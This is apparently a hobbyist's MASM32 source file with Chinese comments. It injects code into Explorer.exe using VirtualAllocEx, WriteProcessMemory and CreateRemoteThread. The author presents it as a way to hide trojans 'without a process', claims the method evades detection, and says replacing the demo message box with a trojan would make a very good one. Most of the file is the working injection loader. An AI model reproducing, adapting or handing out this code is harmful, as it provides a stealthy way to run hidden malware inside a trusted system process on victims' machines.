;太难了 ，想了我一下午！这项技术主要用于木马的隐藏！把RemoteCode.asm内容插入到Explorer.exe
;的内存中去了并执行 ！RemoteCode.asm太难写了，并不是一般的汇编代码就可以执行，而是要考虑自动定位问题！
;要知道，这么长的代码仅仅只为了输出一个消息框，但是和所有无进程木马隐藏原理是一样的！
;这比通过插dll到Explorer.exe中来实现所谓无进程要复杂得多，当然也更加隐蔽！
;因为那种方法是可以用普通工具轻松检测出来的，而这种方法连作者都说自己没有办法发现！看完它的原理，
;想了一下午，终于简写成了自己所能理解的最简单内容了！作者的太复杂，他建立了一个窗口，
;我改成了一个消息框！其实只要知道原理，窗口和消息框都是一样的，只是编写窗口所需时间太长了！
;如果把消息框改成木马程序，那将是一个非常好的木马，但是有个要求就是要对WIN32汇编十分熟悉！

				.386
        .model flat, stdcall
        option casemap :none
include         windows.inc
include         user32.inc
includelib      user32.lib
include         kernel32.inc
includelib      kernel32.lib
include         Macro.inc

          .data?
lpLoadLibrary   dd      ?
lpGetProcAddress        dd  ?
lpGetModuleHandle   dd  ?
dwProcessID     dd      ?
dwThreadID      dd      ?
hProcess            dd      ?
lpRemoteCode        dd      ?
dwTemp          dd      ?
                  .const
szErrOpen           db      '无法打开远程线程!',0
szDesktopClass      db      'Progman',0
szDesktopWindow     db      'Program Manager',0
szDllKernel         db      'Kernel32.dll',0
szLoadLibrary       db      'LoadLibraryA',0
szGetProcAddress    db      'GetProcAddress',0
szGetModuleHandle   db      'GetModuleHandleA',0

                    .code
include         RemoteCode.asm
start:
invoke  GetModuleHandle,addr szDllKernel      ;获取Kernel32.dll模块地址
mov     ebx,eax
invoke  GetProcAddress,ebx,offset szLoadLibrary  ;获取Kernel32.dll中LoadLibraryA函数地址
mov     lpLoadLibrary,eax
invoke  GetProcAddress,ebx,offset szGetProcAddress ;获取Kernel32.dll中GetProcAddress函数地址
mov     lpGetProcAddress,eax
invoke  GetProcAddress,ebx,offset szGetModuleHandle   ;获取Kernel32.dll中szGetModuleHandle函数地址
mov     lpGetModuleHandle,eax
; 查找文件管理器窗口并获取进程ID，然后打开进程
invoke  FindWindow,addr szDesktopClass,addr szDesktopWindow
invoke  GetWindowThreadProcessId,eax,offset dwProcessID
mov     dwThreadID,eax
invoke  OpenProcess,PROCESS_CREATE_THREAD or PROCESS_VM_WRITE or PROCESS_VM_OPERATION,FALSE,dwProcessID
.if     eax
            mov     hProcess,eax


        invoke  VirtualAllocEx,hProcess,NULL,REMOTE_CODE_LENGTH,MEM_COMMIT,
                PAGE_EXECUTE_READWRITE  ; 在进程中分配空间，允许创建一个远程线程
        .if     eax
                mov     lpRemoteCode,eax
                invoke  WriteProcessMemory,hProcess,lpRemoteCode,
                        offset REMOTE_CODE_START,REMOTE_CODE_LENGTH,
                        offset dwTemp   ;写入代码
                invoke  WriteProcessMemory,hProcess,lpRemoteCode,
                        offset lpLoadLibrary,sizeof dword * 3,offset dwTemp
                mov     eax,lpRemoteCode  ;写入获取的函数地址
                add     eax,offset _RemoteThread - offset REMOTE_CODE_START  ;计算函数入口
                invoke  CreateRemoteThread,hProcess,NULL,0,eax,0,0,NULL   ;在hProcess上创建线程，执行eax处的函数
                invoke  CloseHandle,eax
       .endif
       invoke   CloseHandle,hProcess
.else
        invoke  MessageBox,NULL,addr szErrOpen,NULL,MB_OK or MB_ICONWARNING
.endif
invoke  ExitProcess,NULL
end start
